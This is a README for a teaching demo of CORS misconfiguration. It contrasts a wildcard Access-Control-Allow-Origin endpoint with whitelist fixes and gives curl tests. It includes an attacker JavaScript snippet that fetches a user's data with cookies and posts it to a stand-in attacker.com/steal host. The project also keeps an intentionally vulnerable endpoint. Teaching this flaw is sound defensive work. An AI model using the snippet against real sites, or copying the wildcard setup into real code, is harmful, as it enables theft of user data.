# 🔐 CORS Misconfiguration Demo

> **CORS Demo** - Access-Control-Allow-Origin: * vulnerability & whitelist fix

## 🎯 Objectives

Students will understand:
1. **CORS Misconfiguration** - How `Access-Control-Allow-Origin: *` enables data theft
2. **Attack Scenario** - Attacker's website steals user data
3. **Fix with Whitelist** - Validate origins, prevent unauthorized access

---

## 🔍 Vulnerability

**What**: Server returns `Access-Control-Allow-Origin: *`

**Impact**: Any website can access API endpoints and steal sensitive data

**Attack**: JavaScript fetch from attacker's domain with credentials

```javascript
// Attacker's website steals your data
fetch('https://yourapp.com/api/user-data', {
  credentials: 'include' // Attacker sends your cookies!
})
.then(r => r.json())
.then(data => fetch('https://attacker.com/steal', { 
  method: 'POST', 
  body: JSON.stringify(data) 
}))
```

---

## ✅ Solution - Whitelist Origins

**Method 1**: Single trusted domain
```javascript
app.use(cors({
  origin: 'https://trusted.com'
}))
```

**Method 2**: Multiple trusted domains
```javascript
const whitelist = ['https://app.com', 'https://admin.app.com']

app.use(cors({
  origin: (origin, callback) => {
    if (whitelist.includes(origin) || !origin) {
      callback(null, true)
    } else {
      callback(new Error('CORS blocked'))
    }
  }
}))
```

---

## 🎮 Demo

**Access Demo**:
- Browser: http://localhost:3000/cors-demo/
- Production: https://project-webnc-1.onrender.com/cors-demo/

**Test Endpoints**:

```bash
# ❌ Vulnerable - Returns * header
curl -H "Origin: http://attacker.com" \
  http://localhost:3000/security/cors/insecure-data

# ✅ Secure - Validates origin, returns 403 if not in whitelist
curl -H "Origin: http://attacker.com" \
  http://localhost:3000/security/cors/secure-data
```

---

## 📁 Files

```
security-demo/cors/
├── vulnerable-site/
│   └── index.html          # Interactive demo UI
├── docs/
│   ├── CORS_VULNERABILITY.md
│   ├── CORS_ATTACK_SCENARIOS.md
│   ├── CORS_IMPLEMENTATION.md
│   ├── CORS_TEST_CASES.md
│   └── README.md
└── controllers/
    └── cors.controller.js
```

---

## 🧪 Testing

### Browser Demo
1. Open http://localhost:3000/cors-demo/
2. Click "Send Vulnerable Request" → See `*` in response headers
3. Click "Send Secure Request" → See 403 or validation failure
4. Check browser DevTools Network tab for CORS headers

### cURL Testing

**Vulnerable Endpoint** (returns data with `*`):
```bash
curl -i -H "Origin: http://evil.com" http://localhost:3000/security/cors/insecure-data
```

Response:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{ "data": "sensitive information" }
```

**Secure Endpoint** (validates whitelist):
```bash
curl -i -H "Origin: http://evil.com" http://localhost:3000/security/cors/secure-data
```

Response:
```
HTTP/1.1 403 Forbidden
Access-Control-Allow-Origin: (not set)

{ "error": "CORS not allowed" }
```

---

## 📊 Comparison

| Aspect | Vulnerable | Secure |
|--------|-----------|--------|
| **CORS Header** | `*` (wildcard) | Specific origin |
| **External Access** | ✅ Allowed | ❌ Blocked |
| **Data Theft** | ✅ Possible | ❌ Prevented |
| **Same-origin Policy** | ❌ Bypassed | ✅ Enforced |

---

## 🚀 Deployment

```bash
# 1. Start locally
npm start

# 2. Deploy to Render
git push origin main
# Render auto-deploys

# 3. Verify on production
curl https://project-webnc-1.onrender.com/security/cors/config
```

---

**Demo Complete** ✅ CORS vulnerability & fix demonstrated with interactive UI + documentation


